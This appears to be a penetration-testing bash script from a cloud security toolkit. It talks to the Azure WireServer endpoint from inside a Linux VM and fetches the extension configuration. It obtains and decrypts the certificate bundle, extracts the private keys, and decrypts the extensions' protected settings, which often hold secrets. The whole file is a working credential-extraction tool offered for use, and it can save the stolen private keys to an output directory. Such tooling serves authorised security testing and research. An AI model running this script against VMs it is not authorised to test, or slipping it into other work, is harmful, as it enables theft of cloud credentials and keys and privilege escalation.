#!/bin/bash

#
# File: Get-AzureVMExtensionSettingsWireServer-Linux.sh
# Author: Karl Fosaaen (@kfosaaen), NetSPI - 2025
# Description: Bash script for dumping and decrypting Azure VM Extension Settings via the WireServer endpoint
# Original Research: 
#        - "ChaosDB explained: Azure's Cosmos DB vulnerability walkthrough" by Nir Ohfeld and Sagi Tzadik
#            - https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough
#       - "CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data" by Paul Litvak
#           - https://intezer.com/blog/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/
#

# Global variables
WIRESERVER_ENDPOINT="168.63.129.16"
GOALSTATE_URL="http://${WIRESERVER_ENDPOINT}/machine/?comp=goalstate"
VERBOSE=0  # 0 = off, 1 = verbose, 2 = very verbose
TEMP_DIR=""
OUTPUT_DIR=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_verbose() {
    if [ "$VERBOSE" -ge 1 ]; then
        echo -e "${BLUE}[VERBOSE]${NC} $1" >&2
    fi
}

log_very_verbose() {
    if [ "$VERBOSE" -ge 2 ]; then
        echo -e "${BLUE}[VERBOSE]${NC} $1" >&2
    fi
}

# Function to check dependencies
check_dependencies() {
    local missing_deps=()
    
    # Check for required tools
    command -v curl >/dev/null 2>&1 || missing_deps+=("curl")
    command -v openssl >/dev/null 2>&1 || missing_deps+=("openssl")
    command -v base64 >/dev/null 2>&1 || missing_deps+=("base64")
    command -v sed >/dev/null 2>&1 || missing_deps+=("sed")
    command -v grep >/dev/null 2>&1 || missing_deps+=("grep")
    command -v awk >/dev/null 2>&1 || missing_deps+=("awk")
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        log_error "Missing required dependencies: ${missing_deps[*]}"
        log_info "Please install missing dependencies:"
        log_info "  Ubuntu/Debian: sudo apt-get install curl openssl coreutils sed grep gawk"
        log_info "  RHEL/CentOS: sudo yum install curl openssl coreutils sed grep gawk"
        return 1
    fi
    
    return 0
}

# Function to create temporary directory
create_temp_dir() {
    TEMP_DIR=$(mktemp -d -t microburst-XXXXXX)
    if [ $? -ne 0 ]; then
        log_error "Failed to create temporary directory"
        return 1
    fi
    log_verbose "Created temporary directory: $TEMP_DIR"
    return 0
}

# Function to cleanup temporary files
cleanup() {
    if [ -n "$TEMP_DIR" ] && [ -d "$TEMP_DIR" ]; then
        rm -rf "$TEMP_DIR"
        log_verbose "Cleaned up temporary directory: $TEMP_DIR"
    fi
}

# Set trap to cleanup on exit
trap cleanup EXIT

# Function to decode HTML entities in URLs
decode_url() {
    local url="$1"
    echo "$url" | sed 's/&amp;/\&/g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | sed 's/&quot;/"/g'
}

# Step 1: Request the configuration URLs from the Wireserver
get_goalstate_urls() {
    log_verbose "Requesting goalstate configuration from WireServer..."
    
    local goalstate_file="$TEMP_DIR/goalstate.xml"
    
    if ! curl -s \
        --max-time 10 \
        -H "x-ms-agent-name: WALinuxAgent" \
        -H "x-ms-version: 2012-11-30" \
        -o "$goalstate_file" \
        "$GOALSTATE_URL"; then
        log_error "Failed to retrieve goalstate configuration"
        return 1
    fi
    
    if [ ! -s "$goalstate_file" ]; then
        log_error "Goalstate file is empty"
        return 1
    fi
    
    log_verbose "   Retrieved goalstate configuration"
    
    # Extract ExtensionsConfig URL
    local extensions_url
    extensions_url=$(grep -o '<ExtensionsConfig[^>]*>[^<]*</ExtensionsConfig>' "$goalstate_file" | sed 's/<[^>]*>//g' | head -n1)
    extensions_url=$(decode_url "$extensions_url")
    
    if [ -z "$extensions_url" ]; then
        log_error "Failed to extract ExtensionsConfig URL"
        return 1
    fi
    
    log_very_verbose "ExtensionsConfig URL: $extensions_url"
    
    # Extract Certificates URL
    local certificates_url
    certificates_url=$(grep -o '<Certificates[^>]*>[^<]*</Certificates>' "$goalstate_file" | sed 's/<[^>]*>//g' | head -n1)
    certificates_url=$(decode_url "$certificates_url")
    
    if [ -z "$certificates_url" ]; then
        log_error "Failed to extract Certificates URL"
        return 1
    fi
    
    log_very_verbose "Certificates URL: $certificates_url"
    
    # Store URLs in files for later use
    echo "$extensions_url" > "$TEMP_DIR/extensions_url.txt"
    echo "$certificates_url" > "$TEMP_DIR/certificates_url.txt"
    
    return 0
}

# Step 2: Request the ExtensionsConfig URL from the Wireserver
get_extension_config() {
    log_verbose "Requesting ExtensionsConfig from WireServer..."
    
    local extensions_url=$(cat "$TEMP_DIR/extensions_url.txt")
    local extensions_file="$TEMP_DIR/extensions.xml"
    
    if ! curl -s \
        --max-time 10 \
        -H "x-ms-agent-name: WALinuxAgent" \
        -H "x-ms-version: 2012-11-30" \
        -o "$extensions_file" \
        "$extensions_url"; then
        log_error "Failed to retrieve extensions configuration"
        return 1
    fi
    
    if [ ! -s "$extensions_file" ]; then
        log_error "Extensions configuration file is empty"
        return 1
    fi
    
    log_verbose "   Retrieved extensions configuration"
    
    # Extract protected settings from PluginSettings within Plugin elements
    extract_protected_settings_from_plugin "$extensions_file"
    
    return 0
}

# Extract protected settings from PluginSettings field in Plugin elements
extract_protected_settings_from_plugin() {
    local extensions_file="$1"
    
    log_verbose "Extracting protected settings from PluginSettings..."
    
    # Extract PluginSettings from Plugin elements
    local plugin_settings
    plugin_settings=$(sed -n '/<PluginSettings>/,/<\/PluginSettings>/p' "$extensions_file")
    
    if [ -z "$plugin_settings" ]; then
        log_warning "No PluginSettings found in extensions configuration"
        return 1
    fi
    
    log_verbose "   Found PluginSettings in extension configuration"
    
    # Extract protectedSettings and thumbprint from the JSON within PluginSettings
    local protected_settings
    protected_settings=$(echo "$plugin_settings" | sed -n 's/.*"protectedSettings"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n1)
    
    local thumbprint
    thumbprint=$(echo "$plugin_settings" | sed -n 's/.*"protectedSettingsCertThumbprint"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -n1)
    
    local extension_name
    extension_name=$(grep -o 'name="[^"]*"' "$extensions_file" | head -n1 | sed 's/name="\([^"]*\)"/\1/')
    
    if [ -n "$protected_settings" ] && [ -n "$thumbprint" ]; then
        log_success "Found extension with protected settings: $extension_name"
        log_verbose "Certificate thumbprint: $thumbprint"
        
        echo "$protected_settings" > "$TEMP_DIR/protected_settings.txt"
        echo "$thumbprint" > "$TEMP_DIR/thumbprint.txt"
        if [ -n "$extension_name" ]; then
            echo "$extension_name" > "$TEMP_DIR/extension_name.txt"
        fi
        return 0
    else
        log_warning "No protected settings found in PluginSettings"
        return 1
    fi
}

# Step 3: Generate a local key pair
generate_transport_certificate() {
    log_verbose "Generating transport certificate and key pair..."
    
    local cert_key="$TEMP_DIR/transport.key"
    local cert_crt="$TEMP_DIR/transport.crt"
    local cert_der="$TEMP_DIR/transport.der"
    
    # Generate private key
    if ! openssl genrsa -out "$cert_key" 2048 >/dev/null 2>&1; then
        log_error "Failed to generate private key"
        return 1
    fi
    
    # Generate self-signed certificate
    if ! openssl req -new -x509 -key "$cert_key" -out "$cert_crt" -days 1 \
        -subj "/CN=MicroBurst-Temp" >/dev/null 2>&1; then
        log_error "Failed to generate certificate"
        return 1
    fi
    
    # Convert to DER format (required by WireServer)
    if ! openssl x509 -in "$cert_crt" -outform DER -out "$cert_der" >/dev/null 2>&1; then
        log_error "Failed to convert certificate to DER format"
        return 1
    fi
    
    log_verbose "   Generated transport certificate and key pair"
    
    return 0
}

# Step 4: Request the certificate bundle from the WireServer
get_certificate_bundle() {
    log_verbose "Requesting certificate bundle from WireServer..."
    
    local certificates_url=$(cat "$TEMP_DIR/certificates_url.txt")
    local cert_der="$TEMP_DIR/transport.der"
    local bundle_file="$TEMP_DIR/certificate_bundle.xml"
    
    # Base64 encode the DER certificate
    local cert_base64
    cert_base64=$(base64 -w 0 "$cert_der")
    
    # Request certificate bundle with transport certificate
    if ! curl -s \
        --max-time 10 \
        -H "x-ms-agent-name: WALinuxAgent" \
        -H "x-ms-version: 2012-11-30" \
        -H "x-ms-cipher-name: DES_EDE3_CBC" \
        -H "x-ms-guest-agent-public-x509-cert: $cert_base64" \
        -o "$bundle_file" \
        "${certificates_url}&type=fullConfig"; then
        log_error "Failed to retrieve certificate bundle"
        return 1
    fi
    
    if [ ! -s "$bundle_file" ]; then
        log_error "Certificate bundle file is empty"
        return 1
    fi
    
    log_verbose "   Retrieved certificate bundle ($(wc -c < "$bundle_file") bytes)"
    
    return 0
}

# Step 5: Decrypt the certificate bundle
decrypt_certificate_bundle() {
    log_verbose "Decrypting certificate bundle..."
    
    local bundle_file="$TEMP_DIR/certificate_bundle.xml"
    local cert_key="$TEMP_DIR/transport.key"
    local decrypted_file="$TEMP_DIR/decrypted_bundle.p7b"
    
    # Extract base64 data from XML
    local bundle_data
    bundle_data=$(awk '/<Data>/,/<\/Data>/' "$bundle_file" | sed 's/<Data>//g' | sed 's/<\/Data>//g' | tr -d '\n\r\t ')
    
    if [ -z "$bundle_data" ]; then
        log_error "Failed to extract certificate data from XML"
        return 1
    fi
    
    log_very_verbose "Extracted certificate data (${#bundle_data} characters)"
    
    # Decode base64 to binary
    local raw_bundle="$TEMP_DIR/raw_bundle.p7b"
    echo "$bundle_data" | base64 -d > "$raw_bundle"
    
    # Decrypt using transport private key (PKCS#7/CMS format)
    if openssl cms -decrypt -inform DER -in "$raw_bundle" -inkey "$cert_key" -out "$decrypted_file" 2>/dev/null; then
        log_verbose "   Successfully decrypted certificate bundle using CMS"
    elif openssl smime -decrypt -inform DER -in "$raw_bundle" -inkey "$cert_key" -out "$decrypted_file" 2>/dev/null; then
        log_verbose "   Successfully decrypted certificate bundle using SMIME"
    else
        log_error "Failed to decrypt certificate bundle"
        log_error "The WireServer may have changed the encryption format"
        return 1
    fi
    
    if [ ! -s "$decrypted_file" ]; then
        log_error "Decrypted bundle is empty"
        return 1
    fi
    
    return 0
}

# Step 6: Extract certificates and private keys from the decrypted bundle
extract_certificates_from_bundle() {
    log_verbose "Extracting certificates and private keys from bundle..."
    
    local decrypted_file="$TEMP_DIR/decrypted_bundle.p7b"
    local cert_dir="$TEMP_DIR/certs"
    mkdir -p "$cert_dir"
    
    # Try to extract as PKCS#12 bundle
    if openssl pkcs12 -in "$decrypted_file" -nodes -passin pass: -out "$cert_dir/bundle.pem" 2>/dev/null; then
        log_verbose "   Extracted certificates as PKCS#12 bundle"
        
        # Split into individual certificate and key files, storing them as local files
        awk '
        BEGIN { cert_num = 0; key_num = 0; in_cert = 0; in_key = 0; }
        /-----BEGIN CERTIFICATE-----/ { 
            cert_num++; 
            in_cert = 1; 
            cert_file = "'$cert_dir'/cert_" cert_num ".pem"
            print $0 > cert_file
            next
        }
        /-----END CERTIFICATE-----/ { 
            print $0 >> cert_file
            close(cert_file)
            in_cert = 0
            next
        }
        /-----BEGIN PRIVATE KEY-----/ || /-----BEGIN RSA PRIVATE KEY-----/ || /-----BEGIN ENCRYPTED PRIVATE KEY-----/ { 
            key_num++; 
            in_key = 1; 
            key_file = "'$cert_dir'/key_" key_num ".pem"
            print $0 > key_file
            next
        }
        /-----END PRIVATE KEY-----/ || /-----END RSA PRIVATE KEY-----/ || /-----END ENCRYPTED PRIVATE KEY-----/ { 
            print $0 >> key_file
            close(key_file)
            in_key = 0
            next
        }
        in_cert { print $0 >> cert_file }
        in_key { print $0 >> key_file }
        ' "$cert_dir/bundle.pem"
        
        local cert_count=$(ls "$cert_dir"/cert_*.pem 2>/dev/null | wc -l)
        local key_count=$(ls "$cert_dir"/key_*.pem 2>/dev/null | wc -l)
        
        log_verbose "   Extracted and stored $cert_count certificate(s) and $key_count private key(s) as local files"
        
        # If output directory is specified, copy the extracted keys and certs there
        if [ -n "$OUTPUT_DIR" ]; then
            mkdir -p "$OUTPUT_DIR"
            log_info "Saving extracted certificates and private keys to: $OUTPUT_DIR"
            
            for key_file in "$cert_dir"/key_*.pem; do
                if [ -f "$key_file" ]; then
                    cp "$key_file" "$OUTPUT_DIR/"
                    log_very_verbose "Saved private key: $OUTPUT_DIR/$(basename "$key_file")"
                fi
            done
            
            for cert_file in "$cert_dir"/cert_*.pem; do
                if [ -f "$cert_file" ]; then
                    cp "$cert_file" "$OUTPUT_DIR/"
                    log_very_verbose "Saved certificate: $OUTPUT_DIR/$(basename "$cert_file")"
                fi
            done
            
            # Also save the full bundle
            cp "$cert_dir/bundle.pem" "$OUTPUT_DIR/full_bundle.pem"
            log_very_verbose "Saved full bundle: $OUTPUT_DIR/full_bundle.pem"
        fi
        
        # List the extracted files for verification
        for key_file in "$cert_dir"/key_*.pem; do
            if [ -f "$key_file" ]; then
                log_very_verbose "   Extracted private key: $(basename "$key_file")"
            fi
        done
        
        if [ "$key_count" -eq 0 ]; then
            log_error "No private keys were extracted from the bundle"
            return 1
        fi
        
        return 0
    else
        log_error "Failed to extract certificates from bundle"
        return 1
    fi
}

# Step 7: Decrypt the protected settings
decrypt_protected_settings() {
    log_verbose "Decrypting protected settings..."
    
    local protected_settings=$(cat "$TEMP_DIR/protected_settings.txt")
    local cert_dir="$TEMP_DIR/certs"
    
    # Decode base64 protected settings to binary
    local encrypted_file="$TEMP_DIR/encrypted_settings.bin"
    echo "$protected_settings" | base64 -d > "$encrypted_file"
    
    # Try each private key to decrypt
    for key_file in "$cert_dir"/key_*.pem; do
        if [ ! -f "$key_file" ]; then
            continue
        fi
        
        local decrypted_file="$TEMP_DIR/decrypted_settings.json"
        
        # Try to decrypt using PKCS#7/CMS
        if openssl cms -decrypt -inform DER -in "$encrypted_file" -inkey "$key_file" -out "$decrypted_file" 2>/dev/null; then
            if [ -s "$decrypted_file" ] && grep -q '{' "$decrypted_file" 2>/dev/null; then
                log_very_verbose "Successfully decrypted protected settings with $(basename "$key_file")"
                cat "$decrypted_file"
                echo ""
                return 0
            fi
        fi
        
        # Try SMIME format
        if openssl smime -decrypt -inform DER -in "$encrypted_file" -inkey "$key_file" -out "$decrypted_file" 2>/dev/null; then
            if [ -s "$decrypted_file" ] && grep -q '{' "$decrypted_file" 2>/dev/null; then
                log_very_verbose "Successfully decrypted protected settings with $(basename "$key_file")"
                cat "$decrypted_file"
                echo ""
                return 0
            fi
        fi
    done
    
    log_error "Failed to decrypt protected settings with any available key"
    return 1
}

# Function to display usage
usage() {
    cat << EOF
Usage: $0 [OPTIONS]

Azure VM Extension Settings WireServer Extraction Tool (Linux)

This script extracts and decrypts Azure VM Extension protected settings by
communicating with the Azure WireServer endpoint (168.63.129.16).

OPTIONS:
    -o, --output DIR    Output directory to save extracted certificates and private keys
    -v, --verbose       Enable verbose output
    -vv                 Enable very verbose output (includes URLs and detailed debug info)
    -h, --help          Show this help message

EXAMPLES:
    $0                              # Basic extraction and decryption
    $0 -v                          # Verbose output
    $0 -vv                         # Very verbose output (debug mode)
    $0 -o /tmp/certs               # Save extracted keys to /tmp/certs
    $0 -vv -o ./azure_certs        # Very verbose output and save keys

NOTES:
    - This script must be run on an Azure Linux VM
    - Root privileges are required for WireServer access
    - Required tools: curl, openssl, base64, sed, grep, awk
    - If -o is specified, extracted private keys and certificates will be saved persistently

REFERENCES:
    - https://intezer.com/blog/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/
    - https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough

EOF
}

# Main function
main() {
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -vv)
                VERBOSE=2
                shift
                ;;
            -v|--verbose)
                VERBOSE=1
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                usage
                exit 1
                ;;
        esac
    done
    
    log_info "Azure VM Extension Settings WireServer Extraction Tool"
    log_info "================================================================"
    
    # Check dependencies
    if ! check_dependencies; then
        exit 1
    fi
    
    # Create temporary directory
    if ! create_temp_dir; then
        exit 1
    fi
    
    # Step 1: Get goalstate URLs
    if ! get_goalstate_urls; then
        log_error "Failed to retrieve goalstate configuration"
        exit 1
    fi
    
    # Step 2: Get extension configuration and extract protected settings
    if ! get_extension_config; then
        log_error "Failed to retrieve extension configuration"
        exit 1
    fi
    
    # Check if protected settings were found
    if [ ! -f "$TEMP_DIR/protected_settings.txt" ]; then
        log_warning "No protected settings found on this VM"
        log_info "This VM may not have any extensions with protected settings configured"
        exit 0
    fi
    
    # Step 3: Generate transport certificate
    if ! generate_transport_certificate; then
        log_error "Failed to generate transport certificate"
        exit 1
    fi
    
    # Step 4: Get certificate bundle
    if ! get_certificate_bundle; then
        log_error "Failed to retrieve certificate bundle"
        exit 1
    fi
    
    # Step 5: Decrypt certificate bundle
    if ! decrypt_certificate_bundle; then
        log_error "Failed to decrypt certificate bundle"
        exit 1
    fi
    
    # Step 6: Extract certificates from bundle
    if ! extract_certificates_from_bundle; then
        log_error "Failed to extract certificates from bundle"
        exit 1
    fi
    
    # Step 7 & 8: Decrypt and print protected settings
    log_info ""
    log_success "=== DECRYPTED PROTECTED SETTINGS ==="
    if decrypt_protected_settings; then
        log_success "===================================="
        log_info ""
        log_success "Successfully decrypted VM extension protected settings!"
        
        if [ -n "$OUTPUT_DIR" ]; then
            log_info ""
            log_info "Extracted certificates and private keys saved to: $OUTPUT_DIR"
            log_very_verbose "Files saved:"
            log_very_verbose "  - key_*.pem (private keys)"
            log_very_verbose "  - cert_*.pem (certificates)"
            log_very_verbose "  - full_bundle.pem (complete certificate bundle)"
        fi
    else
        log_error "Failed to decrypt protected settings"
        exit 1
    fi
}

# Run main function if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi

